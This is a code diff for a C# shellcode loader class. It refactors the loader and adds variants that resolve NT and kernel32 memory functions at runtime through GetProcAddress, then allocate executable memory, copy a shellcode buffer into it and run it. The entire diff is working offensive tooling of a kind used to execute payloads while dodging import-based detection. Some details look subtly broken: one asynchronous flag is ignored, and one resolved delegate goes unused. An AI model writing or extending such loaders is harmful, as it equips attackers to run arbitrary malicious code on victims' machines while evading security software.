@@ -13,6 +13,7 @@ namespace ShellCodeLoader
     {
         private byte[] ShellCode;
         private IntPtr ptr;
+        private uint RegionSize;
         /// <summary>
         /// Default is false.
         /// </summary>
@@ -24,40 +25,23 @@ namespace ShellCodeLoader
         public ShellCodeLoader(byte[] shellCode) 
         {
             this.ShellCode = shellCode;
-            Asynchronous = false;
+            this.RegionSize = (uint)shellCode.Length;
+            this.ptr = IntPtr.Zero;
+            this.Asynchronous = false;
         }
 
         public void LoadWithNT() 
         {
-
             if (this.Asynchronous)
             {
                 Task.Run(() =>
                 {
-                    this.ptr = IntPtr.Zero;
-                    uint RegionSize = (uint)ShellCode.Length;
-                    Imports.NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
-                    UIntPtr bytesWritten;
-                    Imports.NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
-                    Imports.PageProtection flOld = new Imports.PageProtection();
-                    Imports.NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, ref flOld);
-                    ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
-                    load();
-                    Imports.NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.FreeType.MEM_RELEASE);
+                    NT();
                 });
             }
             else 
             {
-                this.ptr = IntPtr.Zero;
-                uint RegionSize = (uint)ShellCode.Length;
-                Imports.NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
-                UIntPtr bytesWritten;
-                Imports.NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
-                Imports.PageProtection flOld = new Imports.PageProtection();
-                Imports.NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, ref flOld);
-                ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
-                load();
-                Imports.NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.FreeType.MEM_RELEASE);
+                NT();
             }
         }
 
@@ -67,54 +51,144 @@ namespace ShellCodeLoader
             {
                 Task.Run(() =>
                 {
-                    this.ptr = Imports.VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
-                    uint RegionSize = (uint)ShellCode.Length;
-                    UIntPtr writtenBytes;
-                    Imports.WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
-                    Imports.PageProtection flOld;
-                    Imports.VirtualProtect(ptr, RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, out flOld);
-                    ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
-                    load();
-                    Imports.VirtualFree(ptr, (uint)0, Imports.FreeType.MEM_RELEASE);
+                    Kernel32();
                 });
             }
             else 
             {
-                this.ptr = Imports.VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
-                uint RegionSize = (uint)ShellCode.Length;
-                UIntPtr writtenBytes;
-                Imports.WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
-                Imports.PageProtection flOld;
-                Imports.VirtualProtect(ptr, RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, out flOld);
-                ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
-                load();
-                Imports.VirtualFree(ptr, (uint)0, Imports.FreeType.MEM_RELEASE);
+                Kernel32();
+            }       
+        }
+
+        public void LoadWithNTDelegates()
+        {
+            if (this.Asynchronous)
+            {
+                Task.Run(() =>
+                {
+                    NTDelegates();
+                });
+            }
+            else 
+            {
+                NTDelegates();
             }
         }
+
+        public void LoadWithKernel32Delegates() 
+        {
+            if (this.Asynchronous)
+            {
+                Kernel32Delegates();
+            }
+            else
+            {
+                Kernel32Delegates();
+            }
+        }
+
+        private void NT() 
+        {
+            Imports.NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
+            UIntPtr bytesWritten;
+            Imports.NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
+            Imports.PageProtection flOld = new Imports.PageProtection();
+            Imports.NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, ref flOld);
+            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
+            load();
+            Imports.NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.FreeType.MEM_RELEASE);
+        }
+
+        private void Kernel32() 
+        {
+            this.ptr = Imports.VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
+            UIntPtr writtenBytes;
+            Imports.WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
+            Imports.PageProtection flOld;
+            Imports.VirtualProtect(ptr, RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, out flOld);
+            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
+            load();
+            Imports.VirtualFree(ptr, (uint)0, Imports.FreeType.MEM_RELEASE);
+        }
+
+        private void NTDelegates() 
+        {
+            IntPtr ExportedNtAllocateVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtAllocateVirtualMemory");
+            Imports.Delegates.NtAllocateVirtualMemory NtAllocateVirtualMemory = (Imports.Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtAllocateVirtualMemory, typeof(Imports.Delegates.NtAllocateVirtualMemory));
+            NtAllocateVirtualMemory(Imports.GetCurrentProcess(), ref ptr, IntPtr.Zero, ref RegionSize, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
+
+            UIntPtr bytesWritten;
+            IntPtr ExportedNtWriteVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtWriteVirtualMemory");
+            Imports.Delegates.NtWriteVirtualMemory NtWriteVirtualMemory = (Imports.Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtWriteVirtualMemory, typeof(Imports.Delegates.NtWriteVirtualMemory));
+            NtWriteVirtualMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
+
+            Imports.PageProtection flOld = new Imports.PageProtection();
+            IntPtr ExportedNtProtectVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtProtectVirtualMemory");
+            Imports.Delegates.NtProtectVirtualMemory NtProtectVirtualMemory = (Imports.Delegates.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtProtectVirtualMemory, typeof(Imports.Delegates.NtProtectVirtualMemory));
+            NtProtectVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, ref flOld);
+
+            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
+            load();
+
+            IntPtr ExportedNtFreeVirtualMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.NTDLL), "NtFreeVirtualMemory");
+            Imports.Delegates.NtFreeVirtualMemory NtFreeVirtualMemory = (Imports.Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(ExportedNtFreeVirtualMemory, typeof(Imports.Delegates.NtFreeVirtualMemory));
+            NtFreeVirtualMemory(Imports.GetCurrentProcess(), ref ptr, ref RegionSize, Imports.FreeType.MEM_RELEASE);
+        }
+
+        private void Kernel32Delegates() 
+        {
+            IntPtr ExportedVirtualAlloc = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualAlloc");
+            Imports.Delegates.VirtualAlloc VirtualAlloc = (Imports.Delegates.VirtualAlloc)Marshal.GetDelegateForFunctionPointer(ExportedVirtualAlloc, typeof(Imports.Delegates.VirtualAlloc));
+            this.ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)ShellCode.Length, Imports.TypeAlloc.MEM_COMMIT | Imports.TypeAlloc.MEM_RESERVE, Imports.PageProtection.PAGE_EXECUTE_READWRITE);
+
+            UIntPtr writtenBytes;
+            IntPtr ExportedWriteProcessMemory = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "WriteProcessMemory");
+            Imports.Delegates.WriteProcessMemory WriteProcessMemory = (Imports.Delegates.WriteProcessMemory)Marshal.GetDelegateForFunctionPointer(ExportedWriteProcessMemory, typeof(Imports.Delegates.WriteProcessMemory));
+            WriteProcessMemory(Imports.GetCurrentProcess(), ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
+
+            Imports.PageProtection flOld;
+            IntPtr ExportedVirtualProtect = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualProtect");
+            Imports.Delegates.VirtualProtect VirtualProtect = (Imports.Delegates.VirtualProtect)Marshal.GetDelegateForFunctionPointer(ExportedVirtualProtect, typeof(Imports.Delegates.VirtualProtect));
+            VirtualProtect(ptr, RegionSize, Imports.PageProtection.PAGE_EXECUTE_READ, out flOld);
+
+            ShellCodeCaller load = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellCodeCaller));
+            load();
+
+            IntPtr ExportedVirtualFree = Imports.GetProcAddress(Imports.GetModuleHandle(Imports.KERNEL32), "VirtualFree");
+            Imports.Delegates.VirtualFree VirtualFree = (Imports.Delegates.VirtualFree)Marshal.GetDelegateForFunctionPointer(ExportedVirtualFree, typeof(Imports.Delegates.VirtualFree));
+            Imports.VirtualFree(ptr, (uint)0, Imports.FreeType.MEM_RELEASE);
+        }
+        
         private static class Imports 
         {
+
             internal const String KERNEL32 = "kernel32.dll";
             internal const String NTDLL = "ntdll.dll";
 
-            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true)]
+            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
-            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true)]
+            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
-            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true)]
+            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
-            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true)]
+            [DllImport(NTDLL, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);
           
-            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true)]
+            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern IntPtr GetCurrentProcess();
-            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true)]
+            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
-            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true)]
+            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
-            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true)]
+            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
-            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true)]
+            [DllImport(KERNEL32, SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
             public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
+
+            [DllImport(KERNEL32)]
+            public static extern IntPtr GetModuleHandle(string lpModuleName);
+            [DllImport(KERNEL32)]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
             public enum PageProtection : uint
             {
@@ -149,6 +223,27 @@ namespace ShellCodeLoader
                 MEM_RELEASE = 0x00008000,
                 MEM_COALESCE_PLACEHOLDERS = 0x00000001,
                 MEM_PRESERVE_PLACEHOLDER = 0x00000002
+            }
+
+            internal static class Delegates
+            {
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref uint RegionSize, TypeAlloc AllocationType, PageProtection Protect);
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UIntPtr bufferSize, out UIntPtr written);
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint numberOfBytes, PageProtection newProtect, ref PageProtection oldProtect);
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate uint NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, FreeType FreeType);
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate IntPtr VirtualAlloc(IntPtr address, IntPtr numBytes, TypeAlloc commitOrReserve, PageProtection pageProtectionMode);
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, FreeType FreeType);
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
             }
         }
 
